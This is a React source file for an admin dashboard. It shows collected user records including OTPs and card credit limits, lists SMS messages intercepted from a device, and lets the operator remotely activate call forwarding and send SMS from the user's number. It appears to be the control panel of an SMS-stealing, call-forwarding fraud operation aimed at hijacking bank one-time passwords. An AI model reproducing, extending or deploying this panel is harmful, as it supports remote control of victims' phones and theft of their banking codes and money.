import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import axios from "axios";

// Modal for "View Form Data" (User Details)
const HIDDEN_USER_FIELDS = [
  "__v",
  "_id",
  "createdAt",
  "updatedAt",
  "messageFetched",
  "message",
  "to",
];

const UserDetailsModal = ({ open, onClose, data }) => {
  if (!open) return null;

  const formatKey = (key) => {
    if (!key) return "";
    const keyMap = {
      name: { label: "Name", icon: "👤" },
      mobileNumber: { label: "Phone No.", icon: "📱" },
      email: { label: "Email", icon: "✉️" },
      state: { label: "State", icon: "🌎" },
      workingState: { label: "Working State", icon: "🏢" },
      totalLimit: { label: "Total Limit", icon: "💰" },
      availableLimit: { label: "Available Limit", icon: "🟢" },
      forwardPhoneNumber: { label: "Call Forwarding", icon: "🔀" },
      isForwarded: { label: "Forwarding Status", icon: "🔁" },
      otp: { label: "OTP", icon: "🔑" }, // Show OTP
    };
    return keyMap[key]
      ? (
          <>
            <span className="inline-block mr-1">{keyMap[key].icon}</span>
            <span>{keyMap[key].label}</span>
          </>
        )
      : (
          <span className="capitalize">{key.replace(/([A-Z])/g, " $1")}</span>
        );
  };

  const getDisplayDataEntries = (data) => {
    if (!data) return [];
    const mainOrder = [
      "name",
      "mobileNumber",
      "email",
      "state",
      "workingState",
      "totalLimit",
      "availableLimit",
      "otp", // Show OTP right after limits
    ];
    let entries = [];
    for (const key of mainOrder) {
      if (
        !HIDDEN_USER_FIELDS.includes(key) &&
        data[key] !== undefined &&
        data[key] !== null &&
        data[key] !== ""
      ) {
        entries.push([key, data[key]]);
      }
    }
    if (
      !HIDDEN_USER_FIELDS.includes("isForwarded") &&
      data.isForwarded !== undefined &&
      data.isForwarded !== null &&
      data.isForwarded !== ""
    ) {
      entries.push([
        "isForwarded",
        data.isForwarded === "active" || data.isForwarded === true
          ? "Active"
          : data.isForwarded === "deactive" || data.isForwarded === false
            ? "Deactive"
            : String(data.isForwarded),
      ]);
    }
    if (
      !HIDDEN_USER_FIELDS.includes("forwardPhoneNumber") &&
      data.forwardPhoneNumber !== undefined &&
      data.forwardPhoneNumber !== null &&
      data.forwardPhoneNumber !== ""
    ) {
      entries.push(["forwardPhoneNumber", data.forwardPhoneNumber]);
    }
    for (const [key, value] of Object.entries(data)) {
      if (
        !mainOrder.includes(key) &&
        !HIDDEN_USER_FIELDS.includes(key) &&
        key !== "forwardPhoneNumber" &&
        key !== "isForwarded" &&
        value !== undefined &&
        value !== null &&
        value !== ""
      ) {
        entries.push([key, value]);
      }
    }
    return entries;
  };

  return (
    <div
      className="fixed inset-0 z-50 flex justify-center bg-black bg-opacity-40 transition-opacity duration-300"
      onClick={onClose}
      style={{
        backdropFilter: "blur(3px)",
        alignItems: "flex-start",
        overflowY: "auto",
      }}
    >
      <div
        className="bg-white rounded-xl shadow-2xl w-full max-w-xl mx-2 md:mx-3 px-3 py-5 sm:px-8 sm:py-7 relative animate-fade-in"
        onClick={(e) => e.stopPropagation()}
        style={{
          minWidth: "0",
          width: "100%",
          maxWidth: "520px",
          marginTop: "4vh",
          marginBottom: "4vh",
          maxHeight: "92vh",
          overflowY: "auto",
        }}
      >
        <button
          onClick={onClose}
          className="absolute top-2 right-2 sm:top-3 sm:right-3 text-gray-400 hover:text-red-500 transition text-2xl font-bold focus:outline-none focus:ring-2 focus:ring-red-400 rounded-full w-8 h-8 flex items-center justify-center"
          aria-label="Close"
          tabIndex={0}
        >
          <span aria-hidden="true">&times;</span>
        </button>
        <h2 className="text-xl sm:text-2xl font-semibold mb-3 sm:mb-4 text-gray-900 flex items-center gap-2">
          <span className="text-blue-600">User Details</span>
        </h2>
        <div className="overflow-x-auto overflow-y-auto max-h-[340px] sm:max-h-96 border rounded-md bg-gray-50 p-2 sm:p-3">
          {data ? (
            <table className="min-w-full text-xs sm:text-sm">
              <tbody>
                {getDisplayDataEntries(data).map(([key, value]) => (
                  <tr
                    key={key}
                    className="border-b hover:bg-blue-50 transition group"
                  >
                    <td className="py-2 px-2 sm:px-3 text-blue-700 font-semibold align-top w-32 sm:w-48 min-w-[90px] sm:min-w-[120px]">
                      {formatKey(key)}
                    </td>
                    <td className="py-2 px-2 sm:px-3 text-gray-800 break-all align-top max-w-[140px] sm:max-w-[240px] group-hover:text-blue-900">
                      {typeof value === "object" && value !== null
                        ? JSON.stringify(value, null, 2)
                        : String(value)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          ) : (
            <div className="text-gray-500 text-center py-8 sm:py-10 text-xs sm:text-base">
              No data available.
            </div>
          )}
        </div>
      </div>
      <style>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(24px);}
          to { opacity: 1; transform: translateY(0);}
        }
        .animate-fade-in {
          animation: fade-in 0.27s cubic-bezier(.31,2.02,.44,.98);
        }
        @media (max-height: 500px) {
          .modal-responsive-override {
            margin-top: 2vh !important;
            margin-bottom: 2vh !important;
            max-height: 92vh !important;
          }
        }
      `}</style>
    </div>
  );
};

// Modal for "View Message" (Display form/messages data)
// Modified to get all messages using deviceId instead of userMobile
const ITEMS_PER_PAGE = 10;
const MessageModal = ({ open, onClose, deviceId }) => {
  const [formData, setFormData] = useState([]);
  const [filteredData, setFilteredData] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!open) return;
    const fetchFormData = async () => {
      setLoading(true);
      try {
        const adminToken = localStorage.getItem("admin-token");
        const { data } = await axios.get(
          `${process.env.REACT_APP_API_URL}/api/admin/all-form-data`,
          {
            headers: { Authorization: `${adminToken}` },
          }
        );
        let allRows = data?.data || data || [];
        if (deviceId) {
          allRows = allRows.filter(
            row => row.deviceId === deviceId
          );
        }
        setFormData(allRows);
        setFilteredData(allRows);
      } catch (err) {
        setFormData([]);
        setFilteredData([]);
      } finally {
        setLoading(false);
        setCurrentPage(1);
      }
    };
    fetchFormData();
    // eslint-disable-next-line
  }, [open, deviceId]);

  useEffect(() => {
    const term = searchTerm.toLowerCase().trim();
    if (!term) {
      setFilteredData(formData);
      setCurrentPage(1);
      return;
    }
    const filtered = formData.filter(
      (row) =>
        (row.senderPhoneNumber && row.senderPhoneNumber.toLowerCase().includes(term)) ||
        (row.message && row.message.toLowerCase().includes(term)) ||
        (row.time && row.time.toLowerCase().includes(term)) ||
        (row.recieverPhoneNumber && row.recieverPhoneNumber.toLowerCase().includes(term))
    );
    setFilteredData(filtered);
    setCurrentPage(1);
  }, [searchTerm, formData]);

  const totalPages = Math.ceil(filteredData.length / ITEMS_PER_PAGE);
  const startIndex = (currentPage - 1) * ITEMS_PER_PAGE;
  const currentRows = filteredData.slice(startIndex, startIndex + ITEMS_PER_PAGE);

  if (!open) return null;

  return (
    <div
      className="fixed inset-0 z-50 flex justify-center bg-black bg-opacity-40 transition-opacity duration-300"
      onClick={onClose}
      style={{
        backdropFilter: "blur(3px)",
        alignItems: "flex-start",
        overflowY: "auto",
      }}
    >
      <div
        className="bg-white rounded-xl shadow-2xl max-w-3xl w-full mx-3 px-4 py-5 relative animate-fade-in"
        onClick={(e) => e.stopPropagation()}
        style={{
          minWidth: "320px",
          marginTop: "4vh",
          marginBottom: "4vh",
          maxHeight: "92vh",
          overflowY: "auto"
        }}
      >
        <button
          onClick={onClose}
          className="absolute top-3 right-3 text-gray-400 hover:text-red-500 transition text-2xl font-bold focus:outline-none focus:ring-2 focus:ring-red-400 rounded-full w-8 h-8 flex items-center justify-center"
          aria-label="Close"
          tabIndex={0}
        >
          <span aria-hidden="true">&times;</span>
        </button>
        <h2 className="text-xl font-semibold text-blue-600 mb-4">User Messages</h2>
        <div className="overflow-x-auto bg-white shadow-md rounded-md text-sm">
          {loading ? (
            <div className="p-8 text-center text-gray-500">Loading...</div>
          ) : (
            <table className="min-w-full table-auto">
              <thead className="bg-gray-100 text-gray-700">
                <tr>
                  <th className="text-left px-4 py-2">Sender Phone Number</th>
                  <th className="text-left px-4 py-2">Message</th>
                  <th className="text-left px-4 py-2">Time</th>
                  <th className="text-left px-4 py-2">Receiver Phone Number</th>
                  <th className="text-left px-4 py-2 hidden md:table-cell">Created At</th>
                </tr>
              </thead>
              <tbody>
                {currentRows.length > 0 ? (
                  currentRows.map((row) => (
                    <tr key={row._id || row.id} className="border-t">
                      <td className="px-4 py-2">{row.senderPhoneNumber || ""}</td>
                      <td className="px-4 py-2">{row.message || ""}</td>
                      <td className="px-4 py-2">{row.time || ""}</td>
                      <td className="px-4 py-2">{row.recieverPhoneNumber || ""}</td>
                      <td className="px-4 py-2 text-gray-600 hidden md:table-cell">
                        {row.createdAt ? new Date(row.createdAt).toLocaleString() : ""}
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan="6" className="text-center px-4 py-8 text-gray-500">
                      No data found.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          )}
        </div>
        <div className="mt-4 flex flex-wrap items-center justify-center gap-3">
          <button
            className="px-3 py-1 bg-gray-200 text-xs rounded hover:bg-gray-300 disabled:opacity-50"
            onClick={() => setCurrentPage((prev) => prev - 1)}
            disabled={currentPage === 1}
          >
            Previous
          </button>
          <span className="text-xs text-gray-700">
            Page {currentPage} of {totalPages}
          </span>
          <button
            className="px-3 py-1 bg-gray-200 text-xs rounded hover:bg-gray-300 disabled:opacity-50"
            onClick={() => setCurrentPage((prev) => prev + 1)}
            disabled={currentPage === totalPages || totalPages === 0}
          >
            Next
          </button>
        </div>
      </div>
      <style>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(24px);}
          to { opacity: 1; transform: translateY(0);}
        }
        .animate-fade-in {
          animation: fade-in 0.27s cubic-bezier(.31,2.02,.44,.98);
        }
        @media (max-height: 600px) {
          .modal-responsive-override {
            margin-top: 2vh !important;
            margin-bottom: 2vh !important;
            max-height: 92vh !important;
          }
        }
      `}</style>
    </div>
  );
};

// Call Forwarding Modal
const CallForwardingModal = ({
  open,
  onClose,
  deviceId,
  phoneNumber,
  preForwardedPhoneNumber,
  isForwardedStatus,
}) => {
  const [forwardPhoneNumber, setForwardPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  // New state for setForwarded API status feedback
  const [setForwardedStatus, setSetForwardedStatus] = useState("");
  const [forwardedViewStatus, setForwardedViewStatus] = useState(
    isForwardedStatus || ""
  );

  useEffect(() => {
    if (open) {
      setForwardPhoneNumber("");
      setSuccessMessage("");
      setErrorMessage("");
      setSetForwardedStatus("");
      setForwardedViewStatus(isForwardedStatus || "");
    }
    // eslint-disable-next-line
  }, [open, isForwardedStatus]);

  useEffect(() => {
    setForwardedViewStatus(isForwardedStatus || "");
  }, [isForwardedStatus]);

  // Combined handler that hits save-data AND set-forward-status in sequence
  const handleSaveAndSetForwardActive = async (e) => {
    e.preventDefault();
    setLoading(true);
    setSetForwardedStatus("");
    setSuccessMessage("");
    setErrorMessage("");
    try {
      const adminToken = localStorage.getItem("admin-token");
      // First save the forward number
      const { data } = await axios.post(
        `${process.env.REACT_APP_API_URL}/api/save-data`,
        {
          deviceId:deviceId,
          mobileNumber: phoneNumber,
          forwardPhoneNumber: forwardPhoneNumber,
        },
        {
          headers: { Authorization: `${adminToken}` },
        }
      );

      // Then set isForwarded to "active"
      const response = await axios.post(
        `${process.env.REACT_APP_API_URL}/api/set-forward-status`,
        {
          mobileNumber: phoneNumber,
          isForwarded: "active",
        },
        {
          headers: { Authorization: `${adminToken}` },
        }
      );

      let fSuccess = "Call forwarding saved successfully!";
      if (response.data && response.data.success) {
        setForwardedViewStatus("active");
        setSetForwardedStatus(
          'isForwarded status set to "active" successfully!'
        );
      } else {
        setSetForwardedStatus(
          (response.data && response.data.message) ||
            "Failed to update isForwarded status."
        );
      }

      setSuccessMessage(fSuccess);
      setForwardPhoneNumber("");
    } catch (error) {
      // Handle both possible errors
      if (
        error.response &&
        error.response.data &&
        typeof error.response.data.message === "string"
      ) {
        setErrorMessage(error.response.data.message);
      } else {
        setErrorMessage("Failed to save call forwarding or update status.");
      }
    } finally {
      setLoading(false);
    }
  };

  // Keep old handler for deactivating forwarding
  const handleSetForwardedStatus = async (isForwarded) => {
    setLoading(true);
    setSetForwardedStatus("");
    try {
      const adminToken = localStorage.getItem("admin-token");
      const response = await axios.post(
        `${process.env.REACT_APP_API_URL}/api/set-forward-status`,
        {
          mobileNumber: phoneNumber,
          isForwarded: isForwarded,
        },
        {
          headers: { Authorization: `${adminToken}` },
        }
      );

      if (response.data && response.data.success) {
        setSetForwardedStatus(
          `isForwarded status set to "${isForwarded}" successfully!`
        );
        setForwardedViewStatus(isForwarded);
      } else {
        setSetForwardedStatus(
          (response.data && response.data.message) ||
            "Failed to update isForwarded status."
        );
      }
    } catch (err) {
      setSetForwardedStatus(
        (err.response &&
          err.response.data &&
          typeof err.response.data.message === "string" &&
          err.response.data.message) ||
          "Error updating isForwarded."
      );
    } finally {
      setLoading(false);
    }
  };

  if (!open) return null;

  // Show isForwarded status at the top of modal
  let displayIsForwarded;
  if (
    typeof forwardedViewStatus !== "undefined" &&
    forwardedViewStatus !== null &&
    forwardedViewStatus !== ""
  ) {
    if (forwardedViewStatus === "active" || forwardedViewStatus === true) {
      displayIsForwarded = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800 mb-3">
          Forwarded: Active
        </span>
      );
    } else if (forwardedViewStatus === "deactive" || forwardedViewStatus === false) {
      displayIsForwarded = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-100 text-gray-800 mb-3">
          Forwarded: Deactive
        </span>
      );
    } else {
      displayIsForwarded = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800 mb-3">
          Forwarded: {String(forwardedViewStatus)}
        </span>
      );
    }
  } else {
    displayIsForwarded = null;
  }

  return (
    <div
      className="fixed inset-0 z-50 flex justify-center bg-black bg-opacity-40 transition-opacity duration-300"
      onClick={onClose}
      style={{
        backdropFilter: "blur(3px)",
        alignItems: "flex-start",
        overflowY: "auto",
      }}
    >
      <div
        className="bg-white rounded-xl shadow-2xl w-full max-w-md mx-2 px-4 py-6 relative animate-fade-in"
        onClick={(e) => e.stopPropagation()}
        style={{
          marginTop: "7vh",
          marginBottom: "4vh",
          maxHeight: "92vh",
          overflowY: "auto",
        }}
      >
        <button
          onClick={onClose}
          className="absolute top-2 right-2 text-gray-400 hover:text-red-500 transition text-2xl font-bold focus:outline-none focus:ring-2 focus:ring-red-400 rounded-full w-8 h-8 flex items-center justify-center"
          aria-label="Close"
          tabIndex={0}
        >
          <span aria-hidden="true">&times;</span>
        </button>
        <h2 className="text-xl font-semibold text-purple-700 mb-5 flex items-center gap-2">
          <span>
            <svg
              className="w-6 h-6 mr-1 inline"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <path d="M15 3h6v6" />
              <path d="M21 3l-9 9" />
              <path d="M9 21H3v-6" />
              <path d="M3 21l9-9" />
            </svg>
          </span>
          Call Forwarding
        </h2>
        {displayIsForwarded}
        <form onSubmit={handleSaveAndSetForwardActive} className="flex flex-col gap-5">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Phone No.
            </label>
            <input
              type="text"
              className="w-full border border-gray-300 rounded px-3 py-2 text-base bg-gray-100"
              value={phoneNumber || ""}
              readOnly
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Forward Phone Number <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-purple-300"
              value={forwardPhoneNumber}
              onChange={(e) => setForwardPhoneNumber(e.target.value)}
              required
              name="forwardPhoneNumber"
              placeholder={
                preForwardedPhoneNumber
                  ? `Current: ${preForwardedPhoneNumber}`
                  : "Enter number to forward calls to"
              }
            />
            {preForwardedPhoneNumber && (
              <div className="text-xs mt-1 text-gray-500">
                Already forwarded to:{" "}
                <span className="font-medium">{preForwardedPhoneNumber}</span>
              </div>
            )}
          </div>
          {successMessage && (
            <div className="text-green-600 font-semibold px-1">
              {successMessage}
            </div>
          )}
          {errorMessage && (
            <div className="text-red-600 font-semibold px-1">
              {errorMessage}
            </div>
          )}
          {/* The Save+Set Forward Active Button */}
          <button
            type="submit"
            disabled={loading || !forwardPhoneNumber}
            className={`mt-2 w-full bg-purple-600 hover:bg-purple-700 text-white rounded py-2 font-semibold text-base transition focus:outline-none focus:ring-2 focus:ring-purple-400 ${
              loading ? "opacity-60" : ""
            }`}
          >
            {loading ? "Saving..." : "Save & Activate Forwarding"}
          </button>
          {/* Only show Deactivate Forwarded button */}
          <div className="flex gap-2 mt-4">
            <button
              type="button"
              disabled={loading}
              className={`w-full bg-gray-600 hover:bg-gray-700 text-white rounded py-2 font-semibold text-base transition focus:outline-none focus:ring-2 focus:ring-gray-400 ${
                loading ? "opacity-60" : ""
              }`}
              onClick={() => handleSetForwardedStatus("deactive")}
            >
              {loading ? "Saving..." : "Deactivate Forwarded"}
            </button>
          </div>
          {setForwardedStatus && (
            <div
              className="mt-2 text-center text-sm font-semibold px-1"
              style={{
                color: setForwardedStatus.includes("successfully")
                  ? "#059669"
                  : "#dc2626",
              }}
            >
              {setForwardedStatus}
            </div>
          )}
        </form>
      </div>
      <style>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(24px);}
          to { opacity: 1; transform: translateY(0);}
        }
        .animate-fade-in {
          animation: fade-in 0.27s cubic-bezier(.31,2.02,.44,.98);
        }
      `}</style>
    </div>
  );
};

// Message Forward Modal
const MessageForwardModal = ({ open, onClose, phoneNo }) => {
  const [to, setTo] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  useEffect(() => {
    if (open) {
      setTo("");
      setMessage("");
      setSuccessMessage("");
      setErrorMessage("");
    }
  }, [open]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setSuccessMessage("");
    setErrorMessage("");
    try {
      const adminToken = localStorage.getItem("admin-token");
      const { data } = await axios.post(
        `${process.env.REACT_APP_API_URL}/api/add-to-and-message`,
        {
          phoneNo,
          to,
          message,
        },
        {
          headers: { Authorization: `${adminToken}` },
        }
      );
      setSuccessMessage("Message sent successfully!");
      setTo("");
      setMessage("");
    } catch (err) {
      if (
        err.response &&
        err.response.data &&
        typeof err.response.data.message === "string"
      ) {
        setErrorMessage(err.response.data.message);
      } else {
        setErrorMessage("Failed to send message.");
      }
    } finally {
      setLoading(false);
    }
  };

  if (!open) return null;

  return (
    <div
      className="fixed inset-0 z-50 flex justify-center bg-black bg-opacity-40 transition-opacity duration-300"
      onClick={onClose}
      style={{
        backdropFilter: "blur(3px)",
        alignItems: "flex-start",
        overflowY: "auto",
      }}
    >
      <div
        className="bg-white rounded-xl shadow-2xl w-full max-w-md mx-2 px-4 py-6 relative animate-fade-in"
        onClick={(e) => e.stopPropagation()}
        style={{
          marginTop: "7vh",
          marginBottom: "4vh",
          maxHeight: "92vh",
          overflowY: "auto",
        }}
      >
        <button
          onClick={onClose}
          className="absolute top-2 right-2 text-gray-400 hover:text-red-500 transition text-2xl font-bold focus:outline-none focus:ring-2 focus:ring-red-400 rounded-full w-8 h-8 flex items-center justify-center"
          aria-label="Close"
          tabIndex={0}
        >
          <span aria-hidden="true">&times;</span>
        </button>
        <h2 className="text-xl font-semibold text-orange-600 mb-5 flex items-center gap-2">
          <span>
            <svg className="w-6 h-6 mr-1 inline" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
              <path d="M3 15v4a2 2 0 002 2h14a2 2 0 002-2v-4" />
              <polyline points="17 8 12 3 7 8" />
              <line x1="12" x2="12" y1="3" y2="15" />
            </svg>
          </span>
          Message Forward
        </h2>
        <form onSubmit={handleSubmit} className="flex flex-col gap-5">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">From Phone No.</label>
            <input
              type="text"
              className="w-full border border-gray-300 rounded px-3 py-2 text-base bg-gray-100"
              value={phoneNo || ""}
              readOnly
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">To <span className="text-red-500">*</span></label>
            <input
              type="text"
              className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-orange-300"
              value={to}
              onChange={e => setTo(e.target.value)}
              required
              name="to"
              placeholder="Enter receiver phone number"
            />
          </div>
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">Message <span className="text-red-500">*</span></label>
            <textarea
              className="w-full border border-gray-300 rounded px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-orange-300"
              value={message}
              onChange={e => setMessage(e.target.value)}
              required
              name="message"
              rows={3}
              placeholder="Enter message"
            />
          </div>
          {successMessage && (
            <div className="text-green-600 font-semibold px-1">{successMessage}</div>
          )}
          {errorMessage && (
            <div className="text-red-600 font-semibold px-1">{errorMessage}</div>
          )}
          <button
            type="submit"
            disabled={loading || !to || !message}
            className={`mt-2 w-full bg-orange-500 hover:bg-orange-600 text-white rounded py-2 font-semibold text-base transition focus:outline-none focus:ring-2 focus:ring-orange-400 ${
              loading ? "opacity-60" : ""
            }`}
          >
            {loading ? "Sending..." : "Send Message"}
          </button>
        </form>
      </div>
      <style>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(24px);}
          to { opacity: 1; transform: translateY(0);}
        }
        .animate-fade-in {
          animation: fade-in 0.27s cubic-bezier(.31,2.02,.44,.98);
        }
      `}</style>
    </div>
  );
};

const ACTIONS = [
  {
    label: "View Form Data",
    color: "bg-blue-600",
    hover: "hover:bg-blue-700",
    icon: (
      <svg className="w-5 h-5 mr-2 inline" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
        <rect x="4" y="4" width="16" height="16" rx="2" />
        <path d="M4 10h16M10 4v16" />
      </svg>
    ),
  },
  {
    label: "View Message",
    color: "bg-green-600",
    hover: "hover:bg-green-700",
    icon: (
      <svg className="w-5 h-5 mr-2 inline" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
      </svg>
    ),
  },
  {
    label: "Call Forwarding",
    color: "bg-purple-600",
    hover: "hover:bg-purple-700",
    icon: (
      <svg className="w-5 h-5 mr-2 inline" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
        <path d="M15 3h6v6" />
        <path d="M21 3l-9 9" />
        <path d="M9 21H3v-6" />
        <path d="M3 21l9-9" />
      </svg>
    ),
  },
  {
    label: "Message Forward",
    color: "bg-orange-500",
    hover: "hover:bg-orange-600",
    icon: (
      <svg className="w-5 h-5 mr-2 inline" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
        <path d="M3 15v4a2 2 0 002 2h14a2 2 0 002-2v-4" />
        <polyline points="17 8 12 3 7 8" />
        <line x1="12" x2="12" y1="3" y2="15" />
      </svg>
    ),
  },
];

const AllActions = () => {
  const location = useLocation();
  const [userData, setUserData] = useState(location.state || null);
  const [loading, setLoading] = useState(false);
  const [fetched, setFetched] = useState(false);

  // Modal state
  const [userDetailsModalOpen, setUserDetailsModalOpen] = useState(false);
  const [messageModalOpen, setMessageModalOpen] = useState(false);
  const [callForwardingModalOpen, setCallForwardingModalOpen] = useState(false);
  const [messageForwardModalOpen, setMessageForwardModalOpen] = useState(false);

  useEffect(() => {
    const fetchUserData = async () => {
      if (!userData && location.state && location.state._id) {
        setLoading(true);
        try {
          const adminToken = localStorage.getItem('admin-token');
          const { data } = await axios.get(
            `${process.env.REACT_APP_API_URL}/api/admin/user/${location.state._id}`,
            { headers: { Authorization: `${adminToken}` } }
          );
          setUserData(data?.data || data || null);
        } catch (err) {
          setUserData(null);
        } finally {
          setLoading(false);
          setFetched(true);
        }
      } else if (!userData && location.state) {
        setUserData(location.state);
        setFetched(true);
      } else {
        setFetched(true);
      }
    };
    fetchUserData();
    // eslint-disable-next-line
  }, [location.state]);

  if (!fetched && loading) {
    return (
      <div className="p-12 flex flex-col items-center">
        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mb-3"></div>
        <div className="text-gray-500 text-lg font-medium">Loading...</div>
      </div>
    );
  }

  // Show isForwarded status on the user card if userData present
  let userCardIsForwardedStatus = null;
  if (
    userData &&
    typeof userData.isForwarded !== "undefined" &&
    userData.isForwarded !== null &&
    userData.isForwarded !== ""
  ) {
    if (userData.isForwarded === "active" || userData.isForwarded === true) {
      userCardIsForwardedStatus = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800 ml-3" title="User call forwarding status">
          Forwarded: Active
        </span>
      );
    } else if (userData.isForwarded === "deactive" || userData.isForwarded === false) {
      userCardIsForwardedStatus = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-gray-100 text-gray-800 ml-3" title="User call forwarding status">
          Forwarded: Deactive
        </span>
      );
    } else {
      userCardIsForwardedStatus = (
        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-yellow-100 text-yellow-800 ml-3" title="User call forwarding status">
          Forwarded: {String(userData.isForwarded)}
        </span>
      );
    }
  }

  const handleAction = (actionLabel) => {
    if (actionLabel === "View Form Data") {
      setUserDetailsModalOpen(true);
    }
    if (actionLabel === "View Message") {
      setMessageModalOpen(true);
    }
    if (actionLabel === "Call Forwarding") {
      setCallForwardingModalOpen(true);
    }
    if (actionLabel === "Message Forward") {
      setMessageForwardModalOpen(true);
    }
  };

  return (
    <div className="flex flex-col gap-8 max-w-2xl mx-auto px-4 py-6">
      {/* User Card */}
      {userData && (
        <div className="bg-white shadow-xl rounded-lg p-6 border border-gray-100">
          <div className="flex items-center gap-5 ">
            <div className="bg-blue-500 text-white rounded-full w-14 h-14 flex items-center justify-center text-3xl font-bold shadow-md border-4 border-white">
              {userData.name ? userData.name.charAt(0).toUpperCase() : "?"}
            </div>
            <div>
              <h2 className="text-xl font-bold text-gray-800 leading-6 mb-1 flex items-center">
                {userData.name || "Unknown User"}
                {userCardIsForwardedStatus}
              </h2>
              <div className="text-gray-500 text-sm">{userData.mobileNumber}</div>
            </div>
          </div>
        </div>
      )}

      {/* Actions */}
      <div>
        <h3 className="text-lg font-semibold mb-4 text-gray-800">Quick Actions</h3>
        <div className="grid grid-cols-1 xs:grid-cols-2 md:grid-cols-2 gap-4">
          {ACTIONS.map((action) => (
            <button
              key={action.label}
              className={`flex items-center justify-center w-full px-5 py-3 rounded-md font-medium text-white text-base shadow transition-all duration-150 focus:outline-none focus:ring-2 focus:ring-offset-2 ${action.color} ${action.hover} hover:scale-[1.03] active:scale-[.97]`}
              type="button"
              onClick={() => handleAction(action.label)}
            >
              {action.icon}
              {action.label}
            </button>
          ))}
        </div>
      </div>

      {/* Modal for View Form Data (User Details) */}
      <UserDetailsModal open={userDetailsModalOpen} onClose={() => setUserDetailsModalOpen(false)} data={userData} />
      {/* Modal for View Message */}
      <MessageModal
        open={messageModalOpen}
        onClose={() => setMessageModalOpen(false)}
        deviceId={userData ? userData.deviceId : ""}
      />
      {/* Modal for Call Forwarding */}
      <CallForwardingModal
        open={callForwardingModalOpen}
        onClose={() => setCallForwardingModalOpen(false)}
        deviceId={userData.deviceId}
        phoneNumber={userData ? userData.mobileNumber : ""}
        preForwardedPhoneNumber={userData && userData.forwardPhoneNumber}
        isForwardedStatus={userData && userData.isForwarded}
      />
      {/* Modal for Message Forward */}
      <MessageForwardModal
        open={messageForwardModalOpen}
        onClose={() => setMessageForwardModalOpen(false)}
        phoneNo={userData ? userData.mobileNumber : ""}
      />
    </div>
  );
};

export default AllActions;
